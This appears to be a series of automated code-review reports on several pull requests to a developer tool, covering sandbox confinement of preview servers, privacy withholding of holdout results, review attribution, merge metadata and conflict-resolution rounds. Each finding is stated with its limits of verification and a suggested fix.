The findings below are minor or nit, plus one test gap against an acceptance criterion.

findings.title: Abort listener discards stop() promise, so a failed shutdown becomes an unhandled rejection
findings.detail: `onAbort` calls `void stop()`. `stop()` now rethrows ProcessTerminationError from `serving` (lines 113-118), and that rejection has no handler on the abort path. The old `stopTree` never rejected, so this path is new. The owner still observes the same memoized promise through `preview.stop()` in engine.ts:1628, so the run classification is preserved. The leftover effect is an unhandled rejection, which Bun reports as an error with exit status 1.
findings.suggestion: In onAbort, attach a handler, for example `stop().catch(() => {})` with a comment that the owner re-observes the memoized promise through stop(). Alternatively, log the error, so the abort path does not produce an unhandled rejection.
findings.failure_scenario: A run is cancelled while the preview serve is running, and process discovery fails during stopMarkedProcesses. stop() rejects with ProcessTerminationError, the void-ed promise has no handler, and the process reports an unhandled error.

findings.title: Acceptance criterion 'existing UI preview still builds and serves' is not exercised under Seatbelt
findings.detail: The only test that builds and serves this repository's real `.limitless.toml` preview (`bun run build:ui` and `bun src/cli/main.ts serve`) uses the file's fake `startPreview`, so it runs with no sandbox. The real-Seatbelt test (line 469) uses a toy `bun probe.ts` build and a fixture serve. Nothing in the diff shows the real UI build or the real serve running under the new profile, and the change could break that under home read-denial or write denial. I could not run it here (listen EPERM, no node_modules). The implementer's report is '(none)'.
findings.suggestion: Add a darwin-only test using test.skipIf(seatbeltSkip !== null) that runs the repository's real preview config with the real backend, or state in the PR that this was verified manually on an unconfined macOS checkout under the real home, as AGENTS.md requires for confinement changes.
findings.failure_scenario: The repo's `build:ui` or `bun src/cli/main.ts serve` needs a path or write that the preview profile denies. Every preview of this repository then fails, and no test in the suite catches it.

findings.title: Abort before the build now surfaces AbortError instead of 'Preview cancelled'
findings.detail: After `await availablePort()` there is no `signal.aborted` check before the build loop. If the signal aborts before the build starts, the production verify path calls `signal?.throwIfAborted()` (sandbox.ts:114), which throws a DOMException 'This operation was aborted'. The old code produced 'Preview cancelled'. The engine's cancellation check uses `signal.aborted`, so the run is still classified as cancelled and only the message changes.
findings.suggestion: Add `if (signal.aborted) throw new Error("Preview cancelled");` before the build loop, or map AbortError to the existing message.
findings.failure_scenario: The user cancels a run during the port allocation step. The preview error reads 'This operation was aborted' rather than 'Preview cancelled'.

findings.title: Docs still describe preview servers as direct spawns and omit the confinement
findings.detail: AGENTS.md:137-138 lists 'preview servers' among the few direct spawns that manage their own lifecycle, which this change removes. docs/ARCHITECTURE.md:128-131 says build and seed use scratch HOME/TMPDIR and does not mention Seatbelt confinement.
findings.suggestion: Update both passages to say preview build, seed and serve run through runConfined under the same profile as gates.
findings.failure_scenario: A future implementer reads AGENTS.md, believes preview servers are unconfined direct spawns, and adds more of them.

findings.title: Whole startPreview body re-indented into a closure, which makes the diff hard to review
findings.detail: Wrapping the body in `withCommandScratch(cwd, async () => { try {...} ... }, scratch)` re-indents about 100 lines, so the 237-line diff hides the real behavior change. The build/seed loop and the serve launch could each be a small helper, which would keep the logic readable and the diff reviewable.
findings.suggestion: Extract the step loop and the serve launch into helpers invoked from the scoped closure, so the wrapper stays small.
findings.failure_scenario: A reviewer misses a behavior change inside the re-indented block, such as the switch from stopTree to runProcess termination.

output.summary: Reviewed the preview change against the request (run build, seed and serve through runConfined; writable roots limited to checkout and scratch; fail closed; port binding unaffected). The wiring is correct: all three steps go through runConfined with gate-style roots, HOME/TMPDIR point at scratch, ConfinementError propagates, scratch is removed on every failure path, and stop() awaits the serve process before removing scratch. The shared sandbox.ts changes (ownedScratch, onStarted) are narrow and used consistently. I found no blocker or major defect. Runtime verification was limited: in this sandbox, 21 of 24 preview tests fail because local listen() returns EPERM (availablePort is unchanged from base, so this is environmental). With a stubbed port in a TMPDIR copy, 15 pass and the 8 remaining failures are server binds the sandbox denies. Real Seatbelt is skipped here (nested sandbox), and typecheck and lint could not run (no node_modules in the worktree). Remaining findings are minor: a cancellation during verification is misreported, teardown semantics changed without being called out, the repo-preview acceptance test uses the fake backend only, LIMITLESS_* scratch roots are implicit, and onAbort can produce an unhandled rejection.

findings.title: Cancellation during Seatbelt verification is reported as a confinement failure
findings.detail: runSandboxed awaits backend.verify before running the command. probeSeatbelt (sandbox.ts:169-179) treats proc.cancelled as a failed verification and throws ConfinementError('Write confinement not verified: Seatbelt did not enforce its profile'). In the build/seed loop the await runConfined throws before the `if (signal.aborted) throw new Error('Preview cancelled')` check at line 169 runs, so an abort during the verify window surfaces with a misleading message. The serve path (line 182) has the same shape. The engine's cancellation handling may depend on the message.
findings.suggestion: After each awaited runConfined, check signal.aborted first, or catch and rethrow 'Preview cancelled' when the signal is aborted, so cancellation is reported as cancellation. Optionally make probeSeatbelt return a cancellation error when proc.cancelled.
findings.failure_scenario: The user cancels a run while the build's verification probes are running. The preview stage fails with 'Write confinement not verified: Seatbelt did not enforce its profile' instead of 'Preview cancelled', and the run may be recorded as a confinement failure.

findings.title: Teardown semantics changed silently: 100 ms SIGKILL grace and detached grandchildren now killed
findings.detail: Base stopTree sent SIGTERM and escalated to SIGKILL after 2 s, and killed only the process group. runConfined goes through runProcess/stopMarkedProcesses, which uses the engine processScope killGraceMs (100 ms, engine.ts:158) and marker-based discovery. The serve is the full daemon (src/cli/main.ts serve: integrations, DB, UI build), so its graceful shutdown now gets 100 ms before SIGKILL. Also, test/preview.test.ts flips the base 'teardown does not wait for a detached grandchild' test from asserting the grandchild survives to asserting it is killed. The new behaviour is arguably better, but the change is not stated in the request and the grace reduction is not justified anywhere.
findings.suggestion: Call out both changes in the PR description. Confirm that 100 ms is enough for the daemon to shut down cleanly, or pass a longer grace for the serve step. Keep the test name aligned with what it now asserts.
findings.failure_scenario: A preview is stopped while the daemon is flushing its SQLite WAL or closing HTTP connections. It receives SIGKILL 100 ms after SIGTERM instead of 2 s, so shutdown is abrupt. Scratch is deleted afterwards, so no persistent state is lost in the normal case.

findings.title: The repository-preview acceptance test runs only under the fake backend
findings.detail: The 'repository preview builds the UI, seeds, serves health and cleans up' test calls the module-level startPreview, which is wrapped with fakeConfinement (test/preview.test.ts:26). It therefore never exercises the repository's real build:ui and serve commands under Seatbelt. The only real-Seatbelt test uses a small fixture. The acceptance criterion 'an existing UI preview of this repository still builds and serves' is verified only with the fake backend. I could not run the real-backend variant here (nested sandbox), so this is a coverage gap, not a demonstrated failure.
findings.suggestion: Add a darwin-only, skipIf(seatbeltSkip) variant that calls launchPreview directly on the repository copy, mirroring the real-Seatbelt test, or state in the PR that the real-backend check is manual.
findings.failure_scenario: Under the real Seatbelt profile, the repository's serve (full daemon startup: buildUi, resolveBootSha git, DB under scratch) hits a read or write denial that the fake backend cannot reproduce. The test suite stays green while the UI preview fails in production.

findings.title: LIMITLESS_HOME / LIMITLESS_CONFIG_DIR scratch roots are implicit, not granted
findings.detail: The request lists the preview's own LIMITLESS_HOME and LIMITLESS_CONFIG_DIR scratch dirs as writable roots. The code grants only checkout and scratch (writeRoots), and agentEnv strips LIMITLESS_* variables, so these are never set by the factory. They are writable only if the repository's [preview].env maps them under {scratch}, as the current .limitless.toml does. A config that points them elsewhere fails closed at seed with EPERM. Validation does not check that these paths are under {scratch}.
findings.suggestion: Either validate that LIMITLESS_HOME and LIMITLESS_CONFIG_DIR expand under {scratch} in readPreviewConfig, or document that the roots are derived from scratch. Behaviour is safe as written.
findings.failure_scenario: A future .limitless.toml sets LIMITLESS_HOME = '/Users/x/.limitless-preview'. The seed step fails with EPERM, and the error does not point at the env setting.

findings.title: onAbort's fire-and-forget stop() can produce an unhandled rejection
findings.detail: onAbort calls void stop(). stop() can now reject with ProcessTerminationError, because serving's catch rethrows it. Base stopTree never rejected, so this rejection path is new. Nothing handles the promise on the abort path, so a failed shutdown triggered by abort becomes an unhandled rejection instead of surfacing through the caller's stop().
findings.suggestion: Attach a handler on the abort path, for example void stop().catch(() => {}) with the error recorded in the existing assertProcessesStopped channel, or have onAbort record the error for the next command to see.
findings.failure_scenario: Process discovery fails while the serve is terminated on abort. The ProcessTerminationError escapes as an unhandled rejection rather than through the run's error path.

output.summary: The core change does what the request asks. Patch text for files in the pinned head is no longer holdout-matched, deleted files are withheld, and private strings and credentials are still filtered line by line before paging. Holdout-only report sections and quoted lines are still withheld. Lint and typecheck pass on HEAD. The new tests fail on the base source (26 of 78 across mcp-proxy and mcp-http), so they do exercise the change. Two problems block landing: the change-view test times out at Bun's default 5 s limit on this machine (three of three isolated runs), and a partial quote of a verifier-held holdout result still appears in reports. The partial quote predates the diff, but the request is privacy-sensitive and asks that verifier prose stay withheld. I also found dead `keep` code left by the removal of `patchStructure`. I did not run the real holdout pipeline; the privacy analysis relies on reading the code and on throwaway tests in a TMPDIR copy.

findings.title: Partial quotes of verifier-held holdout results still reach reports
findings.detail: Verifier evidence for non-public (holdout) rows is only protected by whole-string matches (collectOutput(..., true) adds the full evidence prose) plus distinctive literals. A report line that quotes a fragment of that evidence passes holdoutRedact: the line is not a detail, so pattern.test and encoded are false. A throwaway test in a TMPDIR copy confirmed this on HEAD, and it returns the same output on the base commit. Request: 'Keep withholding ... verifier prose' and 'holdout results'.
findings.suggestion: Harvest distinctive word n-grams or sentence fragments from non-public verifier evidence, not only the full string, or withhold any report line that shares a multi-word run of at least N words with a non-public result. Add a regression test that quotes a fragment of the evidence.
findings.failure_scenario: Holdout row H-2 has evidence 'Verifier saw the amber lantern glow at dusk.' The report contains 'Verifier note: the amber lantern glow was observed.' limitless_get_change returns that line verbatim (checked on HEAD; the same output on base), so the reviewer sees part of a holdout result.

findings.title: New change-view test exceeds the default 5 s Bun timeout
findings.detail: 'change view preserves PR text and withholds private paths, patch lines, reports and errors on both backends' timed out at 5028–5262 ms in three of three isolated HEAD runs (`bun test test/mcp-proxy.test.ts -t "change view preserves PR text"`). It passed with `--timeout 60000` in 7.4 s. In one full-file run on HEAD, 'change pages reuse the catalogue...' timed out at 5266 ms and caused an unhandled error. Each read recomputes the full 3,022-line patch with per-line privacy (about 70–130 ms per call), and the test makes roughly 14 reads per backend plus paging. The base version fails earlier, so it never reached this cost.
findings.suggestion: Shrink the 3,000-line fixture (the 'safe line' repeat) to what still forces several 16 KB pages, or reduce the number of reads per backend. Alternatively, cache the filtered patch per head and version. Do not raise the timeout without a reason.
findings.failure_scenario: On this machine `bun test test/mcp-proxy.test.ts` reports the change-view test as a timeout failure, so the suite is not green.

findings.title: Dead `keep` branches left in redactMultiline
findings.detail: After patchStructure was removed, no caller passes `keep` to redactMultiline (the only call is at line 341). The `keep` parameter and its branches (lines 162–164, 169–177, 182) are unreachable. The line-prefix and `\\` marker logic therefore also never runs. This adds maintenance cost to the privacy-sensitive code and inflates the diff past the ~120-line budget (145 lines changed in this file).
findings.suggestion: Remove the `keep` parameter and its branches from redactMultiline, and keep the simpler whole-hunk match.
findings.failure_scenario: A future caller passes `keep` expecting structure-aware redaction, but the filtered hunks and prefixes are wrong because that path was never exercised by tests.

findings.title: '1 lines' grammar in withheld markers
findings.detail: Markers such as `[withheld: file absent from PR head; 1 file, ${deletions} lines]`, `[withheld: private text; ${n} lines]` (line 417) and `[withheld: holdout ... ; N lines]` print '1 lines' for a single line. The test at test/mcp-proxy.test.ts asserts the literal string '1 lines'.
findings.suggestion: Pluralize the noun, or use a neutral form such as 'line count: 1'. Update the test assertion to match.
findings.failure_scenario: A one-line deleted file reports '1 lines', which reads as a typo to a reviewer.

findings.title: Private diff lines are withheld whole rather than redacted
findings.detail: privatePatch replaces any line that changes under privacy with '[withheld: private text; 1 line]'. The request's acceptance says the diff is returned 'with private strings and credentials redacted'. A single credential on a long minified line removes the whole line, while the rest of the file stays visible. This is conservative, but it departs from the wording of the acceptance.
findings.suggestion: Either redact the matched span with a consistent marker, or document in the tool description that whole lines are withheld. Keep the current behaviour if the owner prefers it, and say so in the report.
findings.failure_scenario: A file with one private literal in a 400-character line loses that whole line in the reviewer's view, so context is lost beyond the secret itself.

output.summary: Checked the core acceptance against the diff and ran the tests. The change does what the request asks: PR-tree file diffs are returned without holdout withholding, and holdout-only report sections and quoted lines stay withheld with reasons and counts. Private-string and credential filtering still fails closed on diffs, paths and reports. I found no path where holdout-only text reaches the output: holdout artifacts live in the DB, verifiers run read-only with discardChanges afterwards, and the holdout author runs against a base snapshot. Results: in a TMPDIR copy of HEAD, test/mcp-proxy.test.ts and test/mcp-http.test.ts pass 78/78, and test/mcp.test.ts plus test/pipeline-holdout-privacy.test.ts bring the total to 123/123. Biome and tsc are clean. The new shared-words test fails on the base source (26 failures across the two files, versus 0 on HEAD), which meets the fail-first requirement. I could not run the full suite or a live daemon/Git run. Three minor defects and one cleanup item remain, and the privacy-sensitive brief says to land only with every finding fixed, so I request changes.

findings.title: Empty or degenerate verifier criterion ids withhold ordinary report lines
findings.detail:
collectVerification now calls details.add(criterion.id) for every non-public row, with no emptiness guard and no restriction to holdout ids. VerifySchema uses id: z.string(), so raw verifyResults[].modelOutput can carry an empty or whitespace id. holdoutBoundaryPattern('') matches nearly every position, so the pattern withholds almost every report line. I confirmed this with a probe in a TMPDIR copy: report 'Public line one.
Public line two.

## Checks
lint ok' came back as four '[withheld: holdout result or quotation; 1 line]' placeholders plus 'lint ok'. Unrecognised ids such as 'AC-4' or '1' over-withhold the same way. This is over-withholding, not a leak, but it degrades the report view this change is meant to fix.
findings.suggestion: Add only ids that rowKind classifies as 'holdout' (scenario ids), and skip blank ids, e.g. `if (rowKind(...) === 'holdout' && criterion.id.trim()) details.add(criterion.id)`. Add a regression test with criteria id '' in verifyResults.modelOutput asserting that public report lines survive.
findings.failure_scenario: A verifier emits criteria [{id: '', ...}] (valid under VerifySchema). The raw modelOutput is persisted in verifyResults, collectVerification adds '' to the holdout details, and every report line is replaced by a holdout placeholder, so the reviewer loses the public report.

findings.title: Withheld diff lines lose their +/-/space marker
findings.detail: privatePatch replaces the whole line with '[withheld: private text; 1 line]', dropping the leading diff marker. A withheld removed line can no longer be told apart from an added or context line, and the hunk's line structure no longer reads as a diff. The previous holdout path kept the prefix (the keep/prefix logic in redactMultiline), so this is a fidelity regression on the output the request says must be the implementer's diff text.
findings.suggestion: Keep the first character when it is '+', '-' or ' ' and withhold only the content: `const marker = /^[-+ ]/.test(line) ? line[0] : ''; return privacy(line) === line ? line : `${marker}[withheld: private text; 1 line]`;`. The marker is structural, so the privacy check on the full line still holds. Update the test assertions that match the placeholder.
findings.failure_scenario: A diff contains '-const key = "privacy-test-credential"' and '+const key = "new"'. Both come back as '[withheld: private text; 1 line]', so the reviewer cannot see which side of the change the withheld line was on.

findings.title: Deleted-file diffs are now withheld wholesale, though base content carries no holdout text
findings.detail: Before this change, a deleted file's diff went through protect(), so it was returned with holdout redaction. Now any file with prText false (absent from the head tree) is returned only as '[withheld: file absent from PR head; ...]', regardless of holdout overlap. The request limits holdout withholding to hidden tests not in the PR, report sections and verifier prose, and removed lines come from the public base commit. A deletion-only or deletion-heavy PR now shows the reviewer no deleted code at all, which is more restrictive than the stated redaction rule. The new test at test/mcp-proxy.test.ts:331 pins this behaviour.
findings.suggestion: Route deleted-file patches through the same privatePatch plus holdoutRedact path as tree files, or document in the tool description and the request that deletions are intentionally hidden and why. Either way, update the test name and comment to say this is a deliberate choice.
findings.failure_scenario: A PR deletes src/old.ts, which has no holdout overlap. The change view returns '[withheld: file absent from PR head; 1 file, 40 lines]', where the base code returned the removed lines with normal redaction.

findings.title: Dead keep/prefix branch left in redactMultiline; stale hunk comment; budget overrun
findings.detail: No caller passes `keep` any more. The parameter, the keep-only flush branch (lines 162-164), the keep-only line handling (169-174), the prefix computation (182), and the ContentLine.prefix tracking are unreachable. The comment at line 161 ('Neither crosses a hunk boundary') describes hunks that no longer exist. The source diff is about 145 changed lines in mcp-change.ts against the roughly 120-line budget, and this dead code accounts for much of the excess.
findings.suggestion: Remove the keep parameter and its branches, drop the prefix field, and update the comment to describe the whole-value text match. Re-run test/mcp-proxy.test.ts afterwards.
findings.failure_scenario: Not a runtime failure. Future edits could rely on the keep path, which has no test coverage now that patchStructure is gone.

findings.title: Withheld-file message says '1 lines'
findings.detail: The message `[withheld: file absent from PR head; 1 file, ${n} lines]` does not pluralise. The test at test/mcp-proxy.test.ts:331 asserts the same wording, so the string is now part of the contract.
findings.suggestion: Pluralise the line count, or use a neutral form such as `lines: 1`, and update the test expectation at line 331 to match.
findings.failure_scenario: A one-line deletion reports '1 lines' to the reviewer.

output.summary: Reviewed the diff against 21f8de5 and ran the affected suites from a copy under TMPDIR. Land-queue, MCP proxy/change-view, and notifier tests pass on HEAD. The new land and MCP tests fail on the base code (3 land tests; 7 MCP tests, including the change-view refusals and the consumer approval test), so they do exercise the bug. Typecheck passes; biome reports one warning in an unchanged file. Not runnable here: the sandbox refuses local listen on port 0 (EADDRINUSE), so the two api-token-http tests (including the new CLI 401 origin test) and four resolve/resolved-surfaces CLI tests could not execute. I checked the 401 logic by reading and by calling apiTokenHeaders directly. No blocker or major defect found; the findings below are minor.

findings.title: consumer is accepted on the shared review schema, so HTTP callers can record mcp: provenance
findings.detail: ReviewVerdictSchema is used by both limitless_review (MCP) and POST /api/runs/:id/review (submitReview in http.ts). Adding consumer to the shared schema means any HTTP client that sends consumer gets reviewer = mcp:<consumer> (review-round.ts:196-199), even though it did not come through MCP. The request asked for the MCP consumer to be recorded, not for non-MCP callers to be labelled as MCP.
findings.suggestion: Accept consumer only on the MCP reviewSchema (mcp.ts ~line 323) and map it to mcpRequestedBy there before calling backend.review, so the shared HTTP schema and submitReview keep their current reviewer behaviour.
findings.failure_scenario: A UI or script POSTs {verdict:'approve', reviewedSha, consumer:'dashboard'} to /api/runs/:id/review. The approval row and feed item record reviewer 'mcp:dashboard', which misattributes the approval to an MCP agent.

findings.title: MCP approvals without a consumer still record 'human'
findings.detail: Item 2 says MCP approvals should stop showing reviewer 'human'. The change keeps 'human' whenever the MCP caller omits consumer (the test covers this case). That matches #479's optional requestedBy precedent, but the feed still shows the same misattribution for any MCP caller that does not pass consumer. The MCP server has no caller identity to fall back on, so this is a design gap rather than a coding error.
findings.suggestion: Either document that consumer is required for attribution, or have the MCP tool always set mcp:<consumer> with a fixed default (for example 'mcp') when consumer is omitted, so an MCP approval is never labelled 'human'.
findings.failure_scenario: An MCP agent calls limitless_review with verdict 'approve' and no consumer. The feed shows review.approved with reviewer 'human', the same as before the change.

findings.title: The fallback path names a derived origin as the token's 'bound origin'
findings.detail: When api-token.origin is missing (ENOENT) or its tokenHash does not match, apiTokenHeaders falls back to http://127.0.0.1:<client port> and passes that origin to withheld (line 42). main.ts:86-87 then prints 'withheld ... its bound origin <that origin>'. No record binds the token to that origin, so the message can name an origin the token was never bound to. The request asked for the origin the token is bound to.
findings.suggestion: Pass a flag from apiTokenHeaders so the CLI can distinguish a recorded binding from the fallback, and word the message accordingly (for example, 'no bound origin is recorded') in the fallback case.
findings.failure_scenario: ~/.limitless/api-token.origin is deleted. A CLI with LIMITLESS_URL=http://localhost:7400 prints 'API token withheld ... its bound origin http://127.0.0.1:7400', although no record binds the token to that origin.

findings.title: Any non-zero exit from the commit check is reported as an unavailable commit
findings.detail: The loop calls worktreeGit with allowFail:true and treats any result.exitCode !== 0 as 'Required commit X unavailable in local cache'. Before, a timeout, a git failure, or a lock error threw and fell through to 'Local comparison commits or Git inspection unavailable.' A timed-out process (timedOut with a null exit code, since sh does not throw when allowFail is set) is now reported as a missing commit.
findings.suggestion: Check the result for a commit-missing signal (for example, fatal: Not a valid object name or exit code 128 with that message), or rethrow when result.timedOut or exitCode is null, so other failures keep the generic message.
findings.failure_scenario: git cat-file -e times out or hits a lock on the cache. The change view reports 'Required commit <sha> unavailable in local cache', which sends the caller to chase a commit that is present.

findings.title: landed() now sets merged=true on the review owner regardless of its status
findings.detail: Before this change, the land queue set merged only on the run it landed. Now landed() also updates the round's owner through the same updateRun path, skipping the status rules resolveMergedRun applies. An owner in needs_human becomes merged while staying needs_human. The reconciler later resolves it through a network fetch, and an owner in another status would be marked merged with no resolution. The PR really is merged, so the flag is accurate, but the write bypasses the resolution logic and the change is broader than item 1 asked for.
findings.suggestion: Either route the owner through resolveMergedRun (which already fills metadata for the needs_human and succeeded paths), or keep the owner update to the metadata fill for runs already merged, and say in the summary that the owner's merged flag is now set directly.
findings.failure_scenario: A review round lands while its owner is needs_human. The feed shows the owner as merged with status needs_human until a later reconcile pass resolves it, and that pass needs a GitHub fetch.

findings.title: Merge metadata is read once after the merge and never retried
findings.detail: merge() takes a single post-merge gh pr view and maps any failure to null (.catch(() => null)). With polling off, or when the poller's saved snapshot is not refreshed, a null read leaves merged=true with mergedBy/mergedAt null for good, because reconcileMergedRuns skips merged runs unless it has a saved MERGED snapshot. The request asked for the fields to be filled from the queue's merge.
findings.suggestion: Accept the limitation and document it, or retry the post-merge read a bounded number of times before recording null.
findings.failure_scenario: gh pr view fails or reports OPEN right after gh pr merge with polling disabled. The run stays merged with null mergedBy/mergedAt, and the feed item shows no merger.

findings.title: Scope and budget overrun; minor wording and test churn
findings.detail: Source changes are +110/-25 (about 135 changed lines against the roughly 100-line budget). Extra items beyond the four requested: the pagination-pins message, a catch-all message change in mcp.ts, a re-worded tool description, and about six mechanical resultValue<unknown> edits in mcp-proxy.test.ts. The message 'change has 1 files.' is ungrammatical, though the test asserts it.
findings.suggestion: Drop the test-only generic churn, and consider pluralising the file count (the test would need updating too).
findings.failure_scenario: Not a runtime failure; review and maintenance cost only.

findings.title: The 'permanently missing metadata' notifier test passes on the base code and does not exercise the new fill path
findings.detail: I ran it against the base commit and it passes, because the base code also skips merged runs. It guards against extra fetches, which is worthwhile, but the fill-from-snapshot branch in reconcileMergedRuns is only covered by the land-queue test 'later merge observations fill...', which does fail on base. No test covers the consumer-on-HTTP-route case in finding 1.
findings.suggestion: Keep the guard, and add a case to the notifier test that seeds a saved MERGED snapshot and asserts the fill without a client call. Add an HTTP review test that asserts a reviewer for a request without consumer.
findings.failure_scenario: A regression in the fill branch that adds a fetch would pass the notifier test unless the land-queue test catches it.

output.summary: Checked all four items against base and HEAD. Item 3 (change-view reasons) and item 4 (CLI origin message) are implemented correctly. Item 1 fixes the run row but not the feed item the issue cites, and item 2 still records MCP approvals as "human" when the caller omits consumer. Test runs: test/github-notifier.test.ts + test/land-queue.test.ts 116 pass; test/mcp-proxy.test.ts 83 pass with --timeout 120000 (default 5s timeouts failed in this sandbox, not a defect). On base, the three new land-queue tests and all seven new MCP tests fail, as required; the notifier "missing metadata" test passes on base and is a guard only. Broader related run (14 files, 454 tests): 450 pass, 4 fail, all four with 'Failed to start server' from the sandbox refusing local listen on port 0, so environmental. test/api-token-http.test.ts could not run for the same reason; apiTokenHeaders was exercised directly with temp fixtures instead. bun run typecheck passes; biome reports one pre-existing warning outside the diff.

findings.title: Feed run.merged item keeps null mergedBy/mergedAt after the run row is backfilled
findings.detail: landed() writes merged/mergedBy/mergedAt in one updateRun, so the run.merged feed row is created by the SQL trigger (fires only when merged flips 0 to 1) with whatever metadata the post-merge observation had. If that observation lacks metadata, reconcileMergedRuns (github-notifier.ts:159-166) later backfills the run row, but no trigger fires, so the feed item stays mergedBy: null / mergedAt: null. Confirmed with a probe in a copy: after the reconciler filled the parent run, both run.merged feed items still had null metadata. The test 'later merge observations fill queue-landed parent metadata' asserts only the run row and feed count, not feed item data.
findings.suggestion: Make the feed item carry merge metadata when produced, or re-publish/patch run.merged when metadata is backfilled. Extend that test to assert the feed item data after backfill.
findings.failure_scenario: Queue merges PR; post-merge gh pr view returns OPEN or errors. landed() records merged with null metadata and the feed emits run.merged with mergedBy null. The reconciler later sets the run row, but the feed item stays null, so agents reading the feed still see the reported inconsistency.

findings.title: MCP approvals without consumer still recorded as reviewer 'human'
findings.detail: reviewer falls back to parsed.data.reviewer ?? 'human' whenever consumer is absent. The MCP limitless_review tool now accepts an optional consumer, but previously had no such field, so existing agents don't send it and their approvals still show 'human'. The new test encodes this: test/mcp-proxy.test.ts:93 sets reviewer = consumer === undefined ? 'human' : 'mcp:...' for MCP calls. Item 2 asks that MCP approvals show who approved; this leaves the reported symptom for every caller that omits consumer.
findings.suggestion: Default the MCP path to an mcp label when consumer is absent (e.g. in src/integrations/mcp.ts before backend.review), or make consumer required for approve. Update the MCP test so a call without consumer expects an mcp: label. Keep the HTTP path's default unchanged.
findings.failure_scenario: An agent calls limitless_review with verdict approve and no consumer, which is every caller today. review_approvals.reviewer = 'human' and the review.approved feed item attributes the approval to a human.

findings.title: Change-view fallback message merges argument errors and backend failures
findings.detail: Non-custom ZodErrors (e.g. a malformed headSha failing the 40-hex regex) and any thrown backend error both return 'Invalid change-view request or backend unavailable.'. The agent cannot tell which part failed, which item 3 asked to fix. The first ZodError issue is available here and unused.
findings.suggestion: For ZodError, name the first issue's path and message. Keep a separate backend-unavailable message for other failures.
findings.failure_scenario: limitless_get_change with headSha 'abc' returns the combined message, and the agent can't tell whether to fix the argument or retry later.

findings.title: Redundant clause in unknown-file-index check
findings.detail: When q.file is 0 and files is non-empty, selected is files[0], so !selected is false; when files is empty and q.file is 0 the condition is also false. The condition reduces to !selected && q.file > 0; the files.length > 0 operand never changes the result.
findings.suggestion: Write the condition as if (!selected && q.file > 0).
findings.failure_scenario: No behaviour change; the reader is misled about the cases covered.

findings.title: CLI redaction of server 401 text is no longer exercised on this path
findings.detail: The existing 'redact authentication errors' test previously asserted the CLI's redacted 401 text. The change replaces that with the origin-mismatch message, which hides the server text, and the new unrelated-401 test uses a server message with no token. No test now checks that the CLI redacts credentials in a server 401 body. This suite could not run in this sandbox, so the coverage observation is from reading.
findings.suggestion: Keep one CLI case where the origin matches or the token is absent and the server's 401 text contains a token, asserting the output is redacted.
findings.failure_scenario: A change that stops calling redactCredentials on 401 bodies would pass the suite.

findings.title: Land entry stays 'merging' during an extra post-merge gh pr view
findings.detail: merge() now calls getGitHubPr after mergePullRequest succeeds, before landed() finishes the entry. getGitHubPr has a 30 s timeout (github-notifier.ts:49), so the entry can read 'merging' for up to 30 s after a successful merge. The call only supplies optional metadata.
findings.suggestion: Fire the metadata read without blocking the state transition, or accept null and let the reconciler fill the run. Document the trade-off.
findings.failure_scenario: gh pr view hangs after a successful merge, so the entry shows as in progress for 30 s.

findings.title: Unrelated tests re-typed with resultValue<unknown> (churn)
findings.detail: resultValue<T> has no default, so an uninferred T already resolves to unknown. Many unrelated assertions were changed from resultValue(...) to resultValue<unknown>(...) with no behaviour change.
findings.suggestion: Revert the unrelated resultValue<unknown> edits unless typecheck requires them (it passes without them in my check).
findings.failure_scenario: None; inflates the diff.

findings.title: Source diff is about 135 changed lines, over the ~100 budget
findings.detail: numstat on src/ shows 110 insertions and 25 deletions against a budget of about 100 changed source lines. The overage is modest.
findings.suggestion: Note the overage in the PR body or trim unused paths.
findings.failure_scenario: None; scope bookkeeping only.

details.reason: no progress (text or tool activity) for 600s

output.summary: Adversarially reviewed the conflict-round change against the request. The new conflict-rounds suite passes 21/21 when run in a copy with dependencies installed, and the copy typechecks and passes biome. The land-queue trigger, the poller trigger, the in-flight/cap/restart handling, the pinned-lease push, and the failing-resolution paths behave as specified in the code I read and in the tests. Two issues are worth fixing before merge: trigger-time draft/fork/state checks use a saved poller snapshot that can be stale (confirmed with a probe that starts a round on a live draft), and conflict resolutions are reviewed with the quick roster rather than the owner's profile. The remaining findings are minor or nit. Pre-existing sandbox failures (one review-rounds test; eight pipeline-conflicts tests) reproduce identically on the base commit and are not attributed to this change. Not run to completion: land-queue, github-poller, land-store, pipeline-audit, pipeline-review-restart, pipeline-delivery-restart, and feed-store suites.

findings.title: Trigger-time eligibility trusts a stale saved snapshot, so a round can start on a draft or non-factory PR
findings.detail: processConflictTriggers takes the saved poller snapshot whenever one exists and passes it to startConflictTrigger without a live lookup. startConflictTrigger (store.ts:1099) then evaluates draft (line 1124), state, and head against that stale data. The poller refreshes snapshots only about every 45s, and longer under cooldown or rate limiting. Snapshots saved before this change also lack headRefName, isCrossRepository and headRepository, so the branch and fork checks at store.ts:1122 are skipped when those fields are undefined. A probe confirmed the defect: with a saved snapshot showing isDraft:false and the live PR a draft, a land conflict started a round (reviewRounds length 1). The round is refused later at delivery by readPrHead, so the PR itself is not changed, but the requirement 'not for draft PRs' is not enforced at trigger time and a daily-cap slot is spent.
findings.suggestion: On the land and startup paths, do the live readPrHead lookup (as the no-snapshot branch does) before starting, or refuse when the snapshot lacks headRefName/isCrossRepository/headRepository instead of treating undefined as pass.
findings.failure_scenario: PR is converted to draft at t=0; last poll at t=-20s saved isDraft:false. A land request at t=5s blocks with conflicts. processConflictTriggers reads the saved snapshot, startConflictTrigger passes the draft check, and a conflict round starts on a draft PR. Delivery then fails with 'the PR is draft'.

findings.title: Conflict resolutions are reviewed with the quick roster, not the owner's profile
findings.detail: The conflict round is created with profile 'quick' (store.ts:1150) and prepare sets resolvedProfile 'quick' (engine.ts:541). profile(ctx) selects configuredReviewSystem's roster (review-system.ts roster selection), so the resolution review uses the smaller quick roster and skips holdout and acceptance checks. Ordinary review rounds inherit owner.profile (review-round.ts:203). A resolution of a standard or deep PR therefore gets a weaker review than the PR's own profile. The request says to reuse the existing round machinery and to review the resolution.
findings.suggestion: Inherit owner.profile like review rounds do, or document and justify the downgrade in the code and the feed.
findings.failure_scenario: A deep-profile PR gets a semantic merge with a conflict resolution. The resolution is reviewed by the quick roster, so a subtle regression the deep roster would catch is pushed to the PR branch for human review.

findings.title: Migration rebuilds review_rounds and replaces triggers, against the additive-migration rule
findings.detail: The README requires additive migrations so a rolled-back release can still open the database. This file drops two triggers, drops and rebuilds review_rounds, and changes the UNIQUE key. The previous release still opens the database, but its unfiltered reviewRounds() (store.ts:1025 and 1031 in the old code) counts conflict rows toward the review cap and treats an in-flight conflict round as an active review round, so a rollback mid-resolution refuses review verdicts and consumes review budget.
